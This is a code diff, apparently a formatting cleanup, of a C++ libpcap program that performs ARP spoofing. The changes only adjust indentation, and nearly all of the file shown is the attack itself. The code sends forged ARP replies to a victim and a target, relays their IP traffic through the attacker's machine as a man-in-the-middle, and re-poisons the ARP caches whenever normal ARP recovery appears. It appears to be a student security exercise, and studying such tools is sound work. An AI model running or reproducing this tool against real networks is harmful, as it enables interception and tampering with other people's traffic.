@@ -27,9 +27,9 @@ void usage() {
 }
 
 void print_ip(uint32_t ip) {
-    struct in_addr ip_addr;
-    ip_addr.s_addr = htonl(ip);
-    printf("%s", inet_ntoa(ip_addr));
+	struct in_addr ip_addr;
+	ip_addr.s_addr = htonl(ip);
+	printf("%s", inet_ntoa(ip_addr));
 	//와이어샤크 디버깅용으로 만든 임의 함수
 }
 
@@ -48,17 +48,17 @@ Mac get_my_mac_address(const char* my_interface){
 
 Ip get_my_ip_address(const char* my_interface){
 	struct ifreq interface_structure;
-    struct sockaddr_in* ip_addr;
-    int file_descriptor;
+	struct sockaddr_in* ip_addr;
+	int file_descriptor;
 
-    file_descriptor = socket(AF_INET, SOCK_DGRAM, 0);
-    interface_structure.ifr_addr.sa_family = AF_INET;
-    strncpy(interface_structure.ifr_name, my_interface, IFNAMSIZ-1);
-    ioctl(file_descriptor, SIOCGIFADDR, &interface_structure);
-    close(file_descriptor);
+	file_descriptor = socket(AF_INET, SOCK_DGRAM, 0);
+	interface_structure.ifr_addr.sa_family = AF_INET;
+	strncpy(interface_structure.ifr_name, my_interface, IFNAMSIZ-1);
+	ioctl(file_descriptor, SIOCGIFADDR, &interface_structure);
+	close(file_descriptor);
 
-    ip_addr = (struct sockaddr_in*)&interface_structure.ifr_addr;
-    return Ip(ip_addr->sin_addr.s_addr);
+	ip_addr = (struct sockaddr_in*)&interface_structure.ifr_addr;
+	return Ip(ip_addr->sin_addr.s_addr);
 
 }
 
@@ -93,7 +93,7 @@ Mac get_sender_mac_address(pcap_t* handle, Mac source_mac, Ip source_ip, Ip send
 		return Mac("00:00:00:00:00:00");
 	}
 
-	
+
 	while (true) {
 		struct pcap_pkthdr* header;
 		const u_char* replyPacket;
@@ -108,9 +108,9 @@ Mac get_sender_mac_address(pcap_t* handle, Mac source_mac, Ip source_ip, Ip send
 
 		printf("[INFO] Received ARP Reply:\n");
 		printf("       Sender MAC: %s\n", std::string(arpReply->arp_.smac_).c_str());
- 		printf("       Sender IP: ");
-        print_ip(ntohl(arpReply->arp_.sip_));
-        printf("\n");
+		printf("       Sender IP: ");
+		print_ip(ntohl(arpReply->arp_.sip_));
+		printf("\n");
 
 		if (ntohs(arpReply->eth_.type_) == EthHdr::Arp &&
 				ntohs(arpReply->arp_.op_) == ArpHdr::Reply &&
@@ -128,26 +128,26 @@ void send_Arp(pcap_t* handle, Mac sender_mac, Ip sender_ip, Mac target_mac, Ip t
 	//왜 멘토님께서 sender, target으로 하라고 하셨는지 뼈저리게 느낌
 	EthArpPacket packet;
 
-   	packet.eth_.dmac_ = target_mac;            
-    packet.eth_.smac_ = sender_mac;            
-    packet.eth_.type_ = htons(EthHdr::Arp);    
+	packet.eth_.dmac_ = target_mac;            
+	packet.eth_.smac_ = sender_mac;            
+	packet.eth_.type_ = htons(EthHdr::Arp);    
 
-    packet.arp_.hrd_ = htons(ArpHdr::ETHER);  
-    packet.arp_.pro_ = htons(EthHdr::Ip4);     
-    packet.arp_.hln_ = Mac::SIZE;              
-    packet.arp_.pln_ = Ip::SIZE;              
-    packet.arp_.op_ = htons(ArpHdr::Reply);   
+	packet.arp_.hrd_ = htons(ArpHdr::ETHER);  
+	packet.arp_.pro_ = htons(EthHdr::Ip4);     
+	packet.arp_.hln_ = Mac::SIZE;              
+	packet.arp_.pln_ = Ip::SIZE;              
+	packet.arp_.op_ = htons(ArpHdr::Reply);   
 
-    packet.arp_.smac_ = sender_mac;            
-    packet.arp_.sip_ = htonl(sender_ip);      
-    packet.arp_.tmac_ = target_mac;        
-    packet.arp_.tip_ = htonl(target_ip);       
+	packet.arp_.smac_ = sender_mac;            
+	packet.arp_.sip_ = htonl(sender_ip);      
+	packet.arp_.tmac_ = target_mac;        
+	packet.arp_.tip_ = htonl(target_ip);       
 
-    printf("[INFO] Sending ARP Spoofing Packet:\n");
-    printf("       Attacker MAC: %s\n", std::string(sender_mac).c_str());
-    printf("       Spoofed Source IP: %s (Fake Source IP)\n", std::string(sender_ip).c_str());
-    printf("       Target MAC: %s (Victim's MAC)\n", std::string(target_mac).c_str());
-    printf("       Target IP: %s (Victim's IP)\n", std::string(target_ip).c_str());
+	printf("[INFO] Sending ARP Spoofing Packet:\n");
+	printf("       Attacker MAC: %s\n", std::string(sender_mac).c_str());
+	printf("       Spoofed Source IP: %s (Fake Source IP)\n", std::string(sender_ip).c_str());
+	printf("       Target MAC: %s (Victim's MAC)\n", std::string(target_mac).c_str());
+	printf("       Target IP: %s (Victim's IP)\n", std::string(target_ip).c_str());
 
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 
@@ -162,7 +162,7 @@ void relay_packet(pcap_t* handle, Mac myMac, Mac sender_mac, Ip sender_ip, Mac t
 	// smac == sender.mac && dmac ==my.mac => sender.mac = my.mac , dmac = target.mac
 	// smac == target.mac && dmac == my.ac => sender.mac = my.mac , dmac = sender.mac 
 	// 나머지는 무시 
-		while (true) {
+	while (true) {
 		struct pcap_pkthdr* header;
 		const u_char* packet;
 		int res = pcap_next_ex(handle, &header, &packet);
@@ -170,18 +170,18 @@ void relay_packet(pcap_t* handle, Mac myMac, Mac sender_mac, Ip sender_ip, Mac t
 		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
 			fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
 			break;
-			}
+		}
 		PEthHdr eth_hdr = (PEthHdr)packet;
 		if((eth_hdr->type()==EthHdr::Arp)&&(eth_hdr->smac_ == sender_mac || eth_hdr->smac_ == target_mac) && 
-			(eth_hdr->dmac_ == Mac("ff:ff:ff:ff:ff:ff") || eth_hdr -> dmac_ == Mac("00:00:00:00:00:00")||eth_hdr -> dmac_ == myMac))
-		   { 
+				(eth_hdr->dmac_ == Mac("ff:ff:ff:ff:ff:ff") || eth_hdr -> dmac_ == Mac("00:00:00:00:00:00")||eth_hdr -> dmac_ == myMac))
+		{ 
 			//정상적인 arp 요청이 들어 올 때, 이걸 변조 회복 프로세스라고 탐지
 			std::cout << "Inspection Recovery Detected!" << std::endl;
 			send_Arp(handle, myMac, target_ip, sender_mac, sender_ip);
 			sleep(1);
 			send_Arp(handle, myMac, sender_ip, target_mac, target_ip);
 			sleep(1);
-			}
+		}
 		if(eth_hdr->type() == EthHdr::Ip4) {
 			u_char * relay_packet = new u_char[header->caplen];
 			memcpy(relay_packet, packet, header->caplen);
@@ -197,7 +197,7 @@ void relay_packet(pcap_t* handle, Mac myMac, Mac sender_mac, Ip sender_ip, Mac t
 
 			} else if(eth_hdr->smac_ == target_mac && eth_hdr->dmac_ == myMac){
 				relay_eth_hdr->smac_ = myMac;
-            	relay_eth_hdr->dmac_ = sender_mac;
+				relay_eth_hdr->dmac_ = sender_mac;
 				std::cout << "[Relay: Target to Sender]Relay Packet of Mac Address from"<< ": " << std::string(target_mac) <<" to :"<<std::string(sender_mac)<< std::endl;//나중에 usingnamespace std;
 
 			} else {
@@ -218,76 +218,76 @@ void relay_packet(pcap_t* handle, Mac myMac, Mac sender_mac, Ip sender_ip, Mac t
 
 
 int main(int argc, char* argv[]) {
-    if (argc < 4 || argc % 2 != 0) {
-        usage();
-        return -1;
-    }
+	if (argc < 4 || argc % 2 != 0) {
+		usage();
+		return -1;
+	}
 
-    char* dev = argv[1];    
+	char* dev = argv[1];    
 
-    Mac myMac = get_my_mac_address(dev);
-    std::string macStr = std::string(myMac);
+	Mac myMac = get_my_mac_address(dev);
+	std::string macStr = std::string(myMac);
 
-    std::cout << "MAC Address of interface "<< ": " << macStr << std::endl;
-    
-    Ip myIp = get_my_ip_address(dev);    
+	std::cout << "MAC Address of interface "<< ": " << macStr << std::endl;
 
-    printf("IP Address of interface : ");
-    print_ip(myIp);
-    printf("\n");
+	Ip myIp = get_my_ip_address(dev);    
 
-    std::vector<std::thread> threads;
+	printf("IP Address of interface : ");
+	print_ip(myIp);
+	printf("\n");
 
-    for (int i = 2; i < argc; i += 2) {
-        Ip senderIp = Ip(argv[i]);
-        Ip targetIp = Ip(argv[i + 1]);
+	std::vector<std::thread> threads;
 
-        	threads.emplace_back([=]() {
-            char errbuf[PCAP_ERRBUF_SIZE];
-            pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+	for (int i = 2; i < argc; i += 2) {
+		Ip senderIp = Ip(argv[i]);
+		Ip targetIp = Ip(argv[i + 1]);
 
-            if (handle == nullptr) {
-                fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
-                return;
-            }
+		threads.emplace_back([=]() {
+				char errbuf[PCAP_ERRBUF_SIZE];
+				pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
 
-            std::cout << "[INFO] Processing pair: Sender IP = ";
-            print_ip(senderIp);
-            std::cout << ", Target IP = ";
-            print_ip(targetIp);
-            std::cout << std::endl;
+				if (handle == nullptr) {
+				fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
+				return;
+				}
 
-            Mac senderMac = get_sender_mac_address(handle, myMac, myIp, senderIp);
-            sleep(1);
-            Mac targetMac = get_sender_mac_address(handle, myMac, myIp, targetIp);
-            sleep(1);
+				std::cout << "[INFO] Processing pair: Sender IP = ";
+				print_ip(senderIp);
+				std::cout << ", Target IP = ";
+				print_ip(targetIp);
+				std::cout << std::endl;
 
-            if (senderMac.isNull()) {
-                fprintf(stderr, "Failed to get MAC address for IP: ");
-                print_ip(senderIp);
-                std::cout << std::endl;
-                pcap_close(handle);  // handle을 사용한 후 반드시 close
-                return;
-            }
+				Mac senderMac = get_sender_mac_address(handle, myMac, myIp, senderIp);
+				sleep(1);
+				Mac targetMac = get_sender_mac_address(handle, myMac, myIp, targetIp);
+				sleep(1);
 
-            send_Arp(handle, myMac, targetIp, senderMac, senderIp);
-            sleep(1);
-            send_Arp(handle, myMac, senderIp, targetMac, targetIp);
-            sleep(1);
+				if (senderMac.isNull()) {
+					fprintf(stderr, "Failed to get MAC address for IP: ");
+					print_ip(senderIp);
+					std::cout << std::endl;
+					pcap_close(handle);  // handle을 사용한 후 반드시 close
+					return;
+				}
 
-            std::cout << "[INFO] Completed processing for this pair." << std::endl << std::endl;
+				send_Arp(handle, myMac, targetIp, senderMac, senderIp);
+				sleep(1);
+				send_Arp(handle, myMac, senderIp, targetMac, targetIp);
+				sleep(1);
 
-            relay_packet(handle, myMac, senderMac, senderIp, targetMac, targetIp);
+				std::cout << "[INFO] Completed processing for this pair." << std::endl << std::endl;
 
-            std::cout << "[INFO] Completed relay packet for this pair." << std::endl << std::endl;
+				relay_packet(handle, myMac, senderMac, senderIp, targetMac, targetIp);
 
-            pcap_close(handle);  
-        });
-    }
+				std::cout << "[INFO] Completed relay packet for this pair." << std::endl << std::endl;
 
-    for (auto& thread : threads) {
-        thread.join();
-    }
+				pcap_close(handle);  
+		});
+	}
 
-    return 0;
+	for (auto& thread : threads) {
+		thread.join();
+	}
+
+	return 0;
 }
